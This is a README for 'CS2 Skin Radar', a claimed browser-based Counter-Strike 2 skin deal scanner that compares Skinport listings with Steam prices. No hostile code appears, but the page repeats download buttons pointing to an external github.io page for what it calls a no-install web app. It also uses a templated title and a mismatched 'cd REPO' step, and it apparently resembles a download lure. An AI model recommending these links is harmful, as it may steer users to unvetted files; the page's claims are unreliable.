# CS2 Skin Radar - Game Script Utility 2026

> **A web-based Counter-Strike 2 skin deal scanner that compares Skinport listings with Steam reference prices and highlights potential discounts.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lenac85/cs2-skin-radar-win-22912?style=flat-square)](https://github.com/lenac85/cs2-skin-radar-win-22912)

---

<p align="center">
  <a href="https://lenac85.github.io/cs2-skin-radar-win-22912/">
    <img src="https://img.shields.io/badge/Download-CS2%20Skin%20Radar%20Script-brightgreen?style=for-the-badge" alt="Download CS2 Skin Radar Script">
  </a>
</p>

> **[Direct Download - CS2 Skin Radar](https://lenac85.github.io/cs2-skin-radar-win-22912/)**

---

[Download Latest Build](https://lenac85.github.io/cs2-skin-radar-win-22912/)

---

## Overview

CS2 Skin Radar is a browser-based utility for tracking Counter-Strike 2 skin listings and identifying deals that meet selected price and discount requirements. It connects to Skinport data and uses Steam Market prices as a reference for comparison.

The interface is designed for browsing trading opportunities with practical filters for price, discount, item condition, category, and StatTrak status. Results include direct links to relevant Skinport and Steam Market pages, while the hosted build refreshes its data on a recurring three-minute schedule.

---

## Script Features

- Live scanning of Counter-Strike 2 skin deals
- Skinport API integration for listing data
- Comparison against Steam Market reference prices
- Minimum discount filtering
- Maximum price filtering
- Condition-based filtering
- Skin category filtering
- StatTrak item filtering
- Direct purchase links for Skinport listings
- Direct Steam Market links for price reference
- Automatic deployment through GitHub Pages
- Three-minute data refresh interval
- Dependency-free HTML, CSS, and JavaScript implementation

---

## Setup

### Use the Hosted Build

Open the latest hosted version:

[Launch CS2 Skin Radar](https://lenac85.github.io/cs2-skin-radar-win-22912/)

Use the available filters to narrow the displayed listings by discount, price, condition, category, or StatTrak status.

### Run Locally

1. Download or clone the repository.
2. Open the project folder.
3. Serve the files through a local web server.
4. Open the application in a browser.

Example:

```bash
git clone https://github.com/lenac85/cs2-skin-radar-win-22912.git
cd REPO
```

The project uses vanilla HTML, CSS, and JavaScript, so it does not require a package manager or dependency installation for its front-end files.

---

## Options

Use the interface filters to adjust which listings are shown:

| Option | Purpose |
|---|---|
| Minimum discount | Displays listings at or above the selected discount threshold |
| Maximum price | Limits results to items within the selected price range |
| Condition | Narrows results by skin wear or condition |
| Category | Filters listings by item category |
| StatTrak | Includes or excludes StatTrak items |
| Refresh cycle | Updates available data approximately every 3 minutes |

The available values and controls may change as the hosted build is updated.

---

## Compatibility

- **Target game:** Counter-Strike 2
- **Platform:** Web browser
- **Market sources:** Skinport and Steam Market reference prices
- **Implementation:** Vanilla HTML, CSS, and JavaScript
- **Deployment:** GitHub Pages

The utility is intended for browsing and comparing skin listings. It does not modify Counter-Strike 2 game files or provide in-game functionality. Listing availability, prices, API responses, and market links may change independently of the project.

---

## FAQ

### How do I start using CS2 Skin Radar?

Open the hosted build and select the filters that match the listings you want to review. You can also run the project locally from the repository files.

### How often are results updated?

The application is configured to refresh its data approximately every three minutes.

### Can I change the filters?

Yes. Use the minimum discount, maximum price, condition, category, and StatTrak controls to customize the displayed results.

### Can the interface be customized?

The project uses plain HTML, CSS, and JavaScript, making the interface and filtering behavior available for modification within the repository.

### Which markets are supported?

The scanner uses Skinport listing data and compares those listings with Steam Market reference prices. It also provides direct links to both services where available.

### Does the project require JavaScript dependencies?

No external front-end dependencies are required. The project is built with vanilla HTML, CSS, and JavaScript.

### Where is the latest version hosted?

The current hosted build is available here:

[Open the Latest Build](https://lenac85.github.io/cs2-skin-radar-win-22912/)

### Where are project files stored?

The source files are stored in the repository and can be downloaded or cloned for local use and customization.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
